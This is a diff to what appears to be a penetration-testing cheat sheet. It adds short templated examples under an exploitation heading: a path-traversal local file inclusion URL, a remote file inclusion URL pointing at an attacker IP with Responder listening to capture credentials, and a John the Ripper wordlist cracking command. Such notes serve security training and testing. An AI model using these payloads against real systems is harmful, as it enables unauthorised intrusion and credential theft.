@@ -102,6 +102,25 @@ MariaDB [(none)]> SELECT * FROM <table name>;
 #2. - Exploitation
 -----------------------------------------
 
+- Local File Inclusion (LFI)
+
+```
+http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
+
+Remote File Inclusion (RFI)
+
+```
+sudo responder -I <network interface>
+http://<domain name>/<page>?page=//<IP address>/somefile
+```
+
+- John The Ripper
+
+```
+$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
 #3. - Lateral Movement
 -----------------------------------------
 
